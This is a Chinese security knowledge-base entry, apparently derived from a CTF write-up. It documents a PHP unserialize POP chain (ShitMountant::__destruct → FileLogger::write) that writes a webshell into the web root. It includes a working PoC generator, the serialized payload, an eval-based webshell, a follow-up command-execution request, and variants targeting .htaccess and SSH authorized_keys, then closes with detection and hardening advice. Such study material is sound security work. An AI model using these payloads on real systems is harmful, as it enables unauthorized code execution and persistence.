---
id: web-php-deserialization-pop-filelogger-webshell
title: PHP 反序列化 POP 链：__destruct→fetch→FileLogger 写任意路径 WebShell
type: scenario
domain: web
path: web/php/deserialization
technique: php-pop-filelogger-webshell-write
tags:
- php
- deserialization
- pop-chain
- file-write
- webshell
- destruct
- magic-methods
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V12
  verified_at: '2026-11-05T01:33:45+08:00'
  notes: '已对照原文源码、序列化串与图14核对：index.php 的 blueshark: 前缀 + unserialize、ShitMountant::__destruct→fetch→FileLogger::write、logfile=/var/www/html/shell.php、url 为 <?php eval([''cmd'']); ?>，以及 fetched ==> 前缀后 PHP 仍解析执行均与原文/图14一致。原文未涉及版本区间。PoC 未在本机执行。'
url: /docs/web/php/deserialization/web-php-deserialization-pop-filelogger-webshell/
draft: false
kb_aliases:
- FileLogger 反序列化
- __destruct 写文件 getshell
- ShitMountant POP 链
- unserialize 写 webshell
- 魔术方法任意文件写
---

## 一句话结论

当应用对用户输入直接 `unserialize()`，且类中存在 `__destruct` 调用的文件写入方法（如 `FileLogger::write`）时，可构造对象把可控字符串写进 Web 目录下的 PHP 文件；即使写入内容被加上 `fetched ==> ` 前缀，`<?php` 仍会在后续位置被解析执行。

## 原理

- 入口 `index.php` 只检查输入以 `blueshark:` 开头，随后 `unserialize(substr(...))`，没有 `allowed_classes` 限制，攻击者可还原任意已定义类的对象。
- `ShitMountant::__destruct()` 自动调用 `fetch()`：先用 `file_get_contents($this->url)` 读取 `$this->url`，随后执行 `$this->logger->write("fetched ==> " . $this->url)`。
- 把 `$this->logger` 设为 `FileLogger` 对象、`$logfile` 设为 `/var/www/html/shell.php`，`write()` 会把 `"fetched ==> " . $url` 追加写入该路径。
- 把 `$url` 设为 `<?php eval($_POST['cmd']); ?>`，落盘内容为 `fetched ==> <?php eval($_POST['cmd']); ?>`；PHP 会把前缀当作普通 HTML 输出，遇到 `<?php` 后正常解析执行，因此 WebShell 仍然可用。
- `FileLogger::__destruct()` 在对象销毁时若 `$content` 非空还会再写一次，属于重复写入，不影响结果。
- 根因是“反序列化入口 + 可串联的析构函数 + 任意路径文件写入”三要素同时存在；`__destruct` 不需要业务代码显式调用，对象销毁即触发。

## 触发条件

- 存在 `unserialize($_POST[...])`、`unserialize($_GET[...])` 或从数据库读出后反序列化的入口；
- 可用类中有 `__destruct`（或 `__wakeup`）自动触发的方法，并能通过属性控制文件路径与内容；
- 目标路径对 Web 进程可写，且位于 Web 可访问目录或可被包含；
- 类没有对文件路径做白名单/目录限制。

## 利用步骤

1. 审计 `unserialize` 入口和类定义，找 `__destruct` 调用的 `file_put_contents`/`fwrite` 等 sink。
2. 确认文件路径属性（如 `logfile`）与内容来源（如 `url`）可由序列化属性控制。
3. 构造对象：外层 `ShitMountant` 的 `url` 为 PHP 代码，`logger` 为 `FileLogger` 且 `logfile` 指向 Web 目录。
4. 序列化后在入口前加所需前缀（原文 `blueshark:`）提交。
5. 访问写入的 `.php` 文件，用 POST 参数执行命令。

## PoC

```php
<?php
class FileLogger {
    public $logfile = "/tmp/notehub.log";
    public $content = "";
}
class ShitMountant {
    public $url;
    public $logger;
}
$s = new ShitMountant();
$s->url = "<?php eval(\$_POST['cmd']); ?>";
$s->logger = new FileLogger();
$s->logger->logfile = "/var/www/html/shell.php";
echo "blueshark:" . serialize($s);
```

生成的序列化串（原文）：

```text
O:12:"ShitMountant":2:{s:3:"url";s:29:"<?php eval($_POST['cmd']); ?>";s:6:"logger";O:10:"FileLogger":2:{s:7:"logfile";s:23:"/var/www/html/shell.php";s:7:"content";s:0:"";}}
```

提交后访问 `http://target/shell.php`，POST `cmd=system('cat /f*');`。

成功标志：页面先输出 `fetched ==> `，随后返回命令结果。

## 变体与关联

- 变体：把 `logfile` 指向 `.htaccess`、模板文件、计划任务、SSH `authorized_keys` 等，实现其他持久化/提权路径。
- 变体：若写入内容被过滤 `<?php`，可用短标签 `<?=`、`.htaccess` 改写解析器、或换其他 sink（`file_put_contents` 到日志再包含）。
- 关联：[[web-php-deserialization-magic-chain-eval-wakeup-bypass]]（同为魔术方法 POP 链，sink 是 `eval`）；[[web-php-deserialization-compressed-phar-include-bypass]]（phar 触发反序列化）。
- 边界：若入口使用 `allowed_classes` 白名单、类中无文件写 sink、或 Web 目录不可写，本链不成立。

## 检测与防御

- 检测：请求中出现反序列化串前缀（如 `blueshark:`）与 `O:` 对象结构；属性值含 `<?php`、`eval`、`/var/www/html`。
- 检测：Web 目录出现非发布流程写入的 `.php` 文件；`fetched ==> ` 等异常前缀。
- 防御：不要对用户输入 `unserialize`；必须使用时用 `allowed_classes` 白名单；改用 JSON。
- 加固：文件写入路径白名单/固定目录；Web 目录不可写；禁止上传/写入可执行文件；最小权限运行。
